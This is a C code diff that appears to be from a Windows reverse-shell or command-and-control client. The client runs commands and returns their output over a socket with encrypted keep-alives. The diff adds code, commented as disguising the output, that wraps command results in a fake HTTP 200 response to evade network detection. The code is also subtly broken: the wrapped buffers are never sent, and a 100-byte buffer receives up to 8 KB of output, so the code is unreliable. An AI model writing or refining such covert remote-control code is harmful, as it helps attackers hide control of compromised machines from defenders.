@@ -37,8 +37,10 @@ unsigned __stdcall sendKeepAlive(SOCKET* clientSocket) {
     SOCKET clientConnection = *clientSocket;
     // Every 30 seconds, send a KEEP_ALIVE message to the server, to keep the socket open
     while (1) {
-        char keepAlive[1024] = "KEEP_ALIVE";
+        char keepAlive[1024] = "KEEP_ALIVE\n";
+        char message[1200] = "HTTP/1.1 200 OK\r\nContent-Length: 11\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
         encrypt(keepAlive);
+        strncat_s(message, keepAlive, 12);
         Sleep(30000);
         send(clientConnection, keepAlive, strnlen(keepAlive, 11), 0);
     }
@@ -171,6 +173,17 @@ int main(void) {
                 int len = strnlen(commandOutput, 8190);
                 commandOutput[len] = '\n';
                 commandOutput[len + 1] = '\0';
+
+                // Disguise the command output in an HTTP Header
+                char message[100] = "HTTP/1.1 200 OK\r\nContent-Length: ";
+                char messageSize[6];
+                sprintf_s(messageSize, "%d", (int)strnlen(commandOutput, 8190));
+                strncat_s(message, messageSize, 6);
+                char endMessage[46] = "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
+                strncat_s(message, endMessage, 46);
+                strncat_s(message, commandOutput, 8192);
+
+
                 send(clientSocket, commandOutput, strnlen(commandOutput, 8192), 0);
             }
 
